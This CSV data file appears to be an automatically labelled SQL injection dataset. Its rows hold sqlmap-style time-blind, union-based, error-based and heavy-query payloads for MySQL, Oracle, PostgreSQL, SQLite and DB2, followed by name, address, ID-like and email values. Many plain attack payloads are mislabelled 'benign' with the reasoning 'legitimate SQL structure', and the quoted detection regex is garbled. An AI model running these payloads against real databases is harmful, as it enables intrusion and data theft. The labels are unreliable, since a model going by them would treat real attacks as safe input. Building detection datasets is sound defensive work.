id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
25976,1%' ) and 7533 = 7533 and ( '%' = ',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25977,"1' ) where 6634 = 6634 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25978,"1' ) where 7322 = 7322 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25979,"1' in boolean mode ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
25980,"1' ) as idqc where 5288 = 5288 and elt ( 1210 = 1210,sleep ( 5 ) ) --",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25981,1 ) ) ) union all select null--,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25982,"-4586 union all select 2068,2068,2068,2068--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25983,1 ) ) as wwys where 9248 = 9248,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25984,"1"" ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ""mlld"" like ""mlld",error_based,generic,0.85,Signal match: updatexml → error_based (P4); confidence: 0.85,1
25985,"-6085 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",error_based,oracle,0.85,Signal match: ctxsys.drithsx → error_based (P4); DB signature: oracle,1
25986,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""%"" = """,time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
25987,"1%' ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( '%' = '",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25988,1 ) where 1622 = 1622,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25989,"1%"" ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""%"" = """,heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25990,"1"" ) ) union all select null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25991,"1"" ) ) as gprr where 5975 = 5975 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25992,"1"" ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( ""ynwr"" like ""ynwr",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25993,1' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'yxpi' = 'yxpi,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25994,"1 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) # cgow",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25995,1' ) ) as hqhs where 5383 = 5383,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25996,1' and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'ucpa' = 'ucpa,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25997,"end and ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25998,"1"" or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
25999,1 where 4985 = 4985 order by 1#,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26000,-7710' where 5658 = 5658 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26001,"-6363"" ) where 4043 = 4043 union all select 4043,4043,4043,4043,4043,4043,4043,4043,4043--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
26002,"1' ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( 'nlnk' like 'nlnk",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26003,"-2898"" where 3301 = 3301 union all select 3301,3301,3301,3301,3301,3301,3301,3301,3301,3301#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
26004,1 where 9932 = 9932,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26005,"1', ( case when 2872 = 2872 then 1 else null end )",unknown,generic,0.50,Insufficient information to classify,1
26006,-4215 ) where 5782 = 5782 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26007,1' where 1045 = 1045 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
26008,"1"" where 7344 = 7344 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
26009,1' ) as chla where 6098 = 6098,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26010,"1 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
26011,1%' ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( '%' = ',time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
26012,"-2033"" ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26013,"1%"" ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
26014,"1'|| ( select 'fpfl' from dual where 1434 = 1434 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ||'",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26015,1 ) ) ) rlike sleep ( 5 ) #,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
26016,"( select count ( * ) from generate_series ( 1,5000000 ) )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26017,"-1504"" ) as wpes where 6256 = 6256 union all select 6256,6256,6256,6256,6256,6256,6256,6256,6256,6256#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
26018,1 ) where 9683 = 9683,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26019,1%' ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
26020,1 ) union all select null--,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
26021,"1' ) and elt ( 1210 = 1210,sleep ( 5 ) )",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
26022,"1 where 6040 = 6040 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
26023,"-4954%"" ) or 5244 = 4832",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26024,"1"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ""fkmh"" = ""fkmh",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
26025,-8045 ) ) ) order by 1--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26026,"1' ) where 4786 = 4786 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26027,"1%"" order by 1--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26028,1'|| ( select 'qtep' where 2572 = 2572 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
26029,1 ) as zmxb where 8424 = 8424 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26030,"1"" union all select null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
26031,"1 ) ) as queb where 2449 = 2449 union all select null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
26032,"1' ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( 'javh' = 'javh",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26033,1' ) where 8167 = 8167,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26034,"1' ) ) as hmyc where 6732 = 6732 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26035,"-9150%' ) ) ) union all select 7057,7057,7057,7057,7057,7057,7057,7057--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
26036,"1"" ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( ""asvy"" = ""asvy",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26037,"1"" ) ) )",unknown,generic,0.50,Insufficient information to classify,1
26038,"-6760 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) # ikqw",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26039,"1',iif ( 6625 = 6625,1,1/0 )",unknown,generic,0.50,Insufficient information to classify,1
26040,"select count ( * ) from generate_series ( 1,5000000 ) and ( ( 'jloi' = 'jloi",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26041,"1"" ) ) as hace where 8785 = 8785",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26042,1%' ) and 8734 = 5844,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26043,1 rlike sleep ( 5 ),time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
26044,"1"" ) as jmwr where 5978 = 5978 rlike ( select ( case when ( 1396 = 8762 ) then 1 else 0x28 end ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26045,"-9133"" ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""crfy"" = ""crfy",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26046,1'+ ( select ntym where 4750 = 4750,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26047,"1"" ) ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""jgoq"" = ""jgoq",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
26048,"1' where 9116 = 9116 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26049,-5089' ) ) as icbb where 1129 = 1129 or 6250 = 9650,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26050,"-5703' ) or elt ( 2972 = 8708,8708 )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26051,"-6851' ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'csfx' = 'csfx",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26052,"1"" ) where 8153 = 8153",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26053,1' ) ) ) and sleep ( 5 ) and ( ( ( 'vbck' like 'vbck,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
26054,1 ) where 2918 = 2918 and 7533 = 7533--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26055,"-8609%"" ) ) ) union all select 6021,6021,6021,6021,6021,6021--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
26056,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( 'fegp' = 'fegp",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
26057,"1%"" or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ""%"" = """,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
26058,"1"" ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ""fpqh"" = ""fpqh",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
26059,"1 ) ) as rwsn where 9946 = 9946 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
26060,"1'+ ( select wjpc where 5943 = 5943 and make_set ( 8403 = 8403,8899 ) ) +'",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26061,"1%' ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( '%' = '",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26062,-9456%' ) ) ) order by 1#,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26063,99745017c,unknown,generic,0.50,Insufficient information to classify,1
26064,ejerci78,unknown,generic,0.50,Insufficient information to classify,1
26065,"calle valencia de don juan 161, 7?d",unknown,generic,0.50,Insufficient information to classify,1
26066,b3r3al,unknown,generic,0.50,Insufficient information to classify,1
26067,46942381w,unknown,generic,0.50,Insufficient information to classify,1
26068,elder@parcalia.hn,unknown,generic,0.50,Insufficient information to classify,1
26069,24596413y,unknown,generic,0.50,Insufficient information to classify,1
26070,compte,unknown,generic,0.50,Insufficient information to classify,1
26071,leshowit,unknown,generic,0.50,Insufficient information to classify,1
26072,lehar,unknown,generic,0.50,Insufficient information to classify,1
26073,45699398p,unknown,generic,0.50,Insufficient information to classify,1
26074,"calle profesor angel lacalle, s/n,",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26075,tardn,unknown,generic,0.50,Insufficient information to classify,1
26076,3.54937E+15,unknown,generic,0.50,Insufficient information to classify,1
26077,rigby,unknown,generic,0.50,Insufficient information to classify,1
26078,caada del hoyo,unknown,generic,0.50,Insufficient information to classify,1
26079,englert,unknown,generic,0.50,Insufficient information to classify,1
26080,threader,unknown,generic,0.50,Insufficient information to classify,1
26081,elias pallares,unknown,generic,0.50,Insufficient information to classify,1
26082,f1581il2ente,unknown,generic,0.50,Insufficient information to classify,1
26083,57317186j,unknown,generic,0.50,Insufficient information to classify,1
26084,bocana$da,unknown,generic,0.50,Insufficient information to classify,1
26085,escarpelo,unknown,generic,0.50,Insufficient information to classify,1
26086,3.4008E+15,unknown,generic,0.50,Insufficient information to classify,1
26087,"calle limones, 60,",unknown,generic,0.50,Insufficient information to classify,1
26088,dillard,unknown,generic,0.50,Insufficient information to classify,1
26089,casas de miravete,unknown,generic,0.50,Insufficient information to classify,1
26090,olea de boedo,unknown,generic,0.50,Insufficient information to classify,1
26091,empuar,unknown,generic,0.50,Insufficient information to classify,1
26092,0o380ado6,unknown,generic,0.50,Insufficient information to classify,1
26093,montroy,unknown,generic,0.50,Insufficient information to classify,1
26094,99997973e,unknown,generic,0.50,Insufficient information to classify,1
26095,8.36404E+15,unknown,generic,0.50,Insufficient information to classify,1
26096,"grupo fuensanta 197, 12?a",unknown,generic,0.50,Insufficient information to classify,1
26097,jalance,unknown,generic,0.50,Insufficient information to classify,1
26098,4.20136E+14,unknown,generic,0.50,Insufficient information to classify,1
26099,"c/ ricardo gutierrez 26, 8-d",unknown,generic,0.50,Insufficient information to classify,1
26100,ivancevi,unknown,generic,0.50,Insufficient information to classify,1
26101,castil de vela,unknown,generic,0.50,Insufficient information to classify,1
26102,genaro,unknown,generic,0.50,Insufficient information to classify,1
26103,ergasto,unknown,generic,0.50,Insufficient information to classify,1
26104,"llosa de ranes, la",unknown,generic,0.50,Insufficient information to classify,1
26105,es2eri5o,unknown,generic,0.50,Insufficient information to classify,1
26106,cuenca,unknown,generic,0.50,Insufficient information to classify,1
26107,02054707w,unknown,generic,0.50,Insufficient information to classify,1
26108,21184515c,unknown,generic,0.50,Insufficient information to classify,1
26109,5.71439E+15,unknown,generic,0.50,Insufficient information to classify,1
26110,marcano giner,unknown,generic,0.50,Insufficient information to classify,1
26111,lemoine5@informatica2009.zr,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26112,pr3caz,unknown,generic,0.50,Insufficient information to classify,1
26113,marsh@comerciosaspe.ke,unknown,generic,0.50,Insufficient information to classify,1
26114,inescourt7@citycvs.mil,unknown,generic,0.50,Insufficient information to classify,1
26115,"c/ julia minguillon, 179, 7-a",unknown,generic,0.50,Insufficient information to classify,1
26116,obsequ.iosa,unknown,generic,0.50,Insufficient information to classify,1
26117,"calle carlos amel, 32, 12?h",unknown,generic,0.50,Insufficient information to classify,1
26118,kallewar,unknown,generic,0.50,Insufficient information to classify,1
26119,59760678p,unknown,generic,0.50,Insufficient information to classify,1
26120,toperzer1,unknown,generic,0.50,Insufficient information to classify,1
26121,canaan,unknown,generic,0.50,Insufficient information to classify,1
26122,suzuki,unknown,generic,0.50,Insufficient information to classify,1
26123,"antigua de ancora s/n,",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26124,"calle dean miranda 106, 6-f",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
26125,madgett,unknown,generic,0.50,Insufficient information to classify,1
26126,gerola pugliesi,unknown,generic,0.50,Insufficient information to classify,1
26127,"c/ comedias, 109,",unknown,generic,0.50,Insufficient information to classify,1
26128,8.61689E+15,unknown,generic,0.50,Insufficient information to classify,1
26129,tanchak,unknown,generic,0.50,Insufficient information to classify,1
26130,"don quijote 81,",unknown,generic,0.50,Insufficient information to classify,1
